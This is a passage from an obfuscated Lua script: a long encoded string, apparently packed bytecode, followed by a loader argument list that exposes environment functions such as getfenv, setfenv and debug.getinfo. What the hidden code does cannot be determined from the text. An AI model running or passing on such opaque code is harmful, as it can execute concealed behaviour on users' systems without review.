319U345437WY2UP393C395R3R2I2BL3R1L3DH23R2L382D3A4T2UP385S3ATW2UP2NC3I7Z3R3336073EFO332Y3QXX3BVP3R2Y3QLC3B1W3AOG332C2QY31C03BVO38473EFO3QYL3AMJ31A431WW3KV432ZI3190319U3LIV3KGY3BPU38GO3AEW3BPU39V53NOK39YD31C0335J3QLR33C237VS34ON2FQ27T3GPY3R493AWL3BH93R1R3B253AW83DQ0391P3R1W3CL22FQ399V3R212BL3R4M3R243BEB398P3R2739MZ3R293EZQ315Z34GZ3F4J3R2E3FTQ3OBN3AB03273333M3R2W3OUP3A0R2UP3R543QYH2BL3R5A333E2I3399C3G6I3R5G37U13M9L3K4B319C3AMJ3R3934GP27D3R3E389531C034HK3BKL37YS3IV73BCH315631SD34IF335D31A43BQI3R3N3N0839UD318O31WW3R443R033BBM34J93ODJ2FQ2FE3GPY3R6G3R4C3R1Q3R183B1R3AW83IUC3R4I3B2F3R1X38S52FQ2F23R4N2F13BAS331Y3R253R4S3CD23QZO3R1A3EI334ML3R4Z3PSM3R2G3EI337UR316O3R553BBN34FW3B282UP3R7B3R5B27A3R7H3R5E21939F93G6I3R7N3R5J3R1M38J13R373FYI318O34LR3PGU3BFB2GV31C034L73R5Q37ZP39IS38NX33993R5Z27B34MB3R623LRJ3R653R403R7U3CCM3IVI3R05338E3E6U39YC3CRF2FQ39BS3GPY3R8N3R6J3AZ73QU63AZH2Y83Q983AEW2O93QUB3R4K32RY3QYX37UR25P3R6X3A0738DJ3R703R283BR33R2B32CM3R2D3R773O6237Y631293R7C319U3R7E39JQ2UP3R9G3R7I2193R9M3R7L26O3QW4332Q3R9R3R2T3R5K38NJ3R5M3BFB3R3934QV3R823CGF3R7Z27B34UJ39YD3R5W3AFO3R5Y38HM34WB3EQN3R643QYL38CR3R393R692AX3R8H3K183EI234WK3CUP2FQ2NV3GPY3RAQ3R8Q3DHZ3R8S3AZI2Y834TL3R6P3R8Y3CBQ39SY37IZ32Z437UR28L380W3R6Z3B8W3R4U3R993EI334SG3LVI3E6V3R2F3R9E37UR25U3R2J335O3R9I3R58382A3QZ837Y63RBJ39I133232I32TP3G6I3RBV3R7Q3BI63R7S3BR33R3934UA3RA23BCH3RA43P6139TZ3R8339GW3CGF3R8728R38493R633BPU3R8C38023RAH3R1I3R6B3AC63BYG3RAO37ET3G0237Y625C3R0Y3R4D3R6L3C1Z3AW8350K38ET3R4J3RB133BG3RB337Y61F37IZ3AVY3R4R3RB932YR3R4V37U7315Z3M0M3RAW3R9D3R523BBC1D3RB33R2K3R7D3RBN3RDJ3R2R3OW737IZ3R7L21E37IZ387F3RDT3R9V3R7R3R9Y3BDQ3R393A6E3R7X3BDQ3RC63CYM3R823RA83NCS3BFB3RCC3GNV37RV3RCF334I3RCH3RAG338E3RAI2EX3RCL3ECK3ELA3RCO1Z37IZ3CM53REP3B5B3A3E3RAU3CB03AW83JH13R1V3R6Q3R8Z3QHO3QPM3BEF3RD63R6Y3RD83R4T3RDA3RBB3IZD3R9C3R193R7839V2332Q2303RDK3RBL3NPK3RBN3RFH3RDP3CWF3RDR3RBT347R3RDU37Y623139JF3R2U39N33RC03CGF3R393N8C3JHS3BPU3RE535653RE73RE33R8532ZI3REB3APZ31CA3REE33993REG3LVK3R683RCK3NTN3EI2357R3R6E35DJ3REQ37Y61239JF3QWV3P2Z27C',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
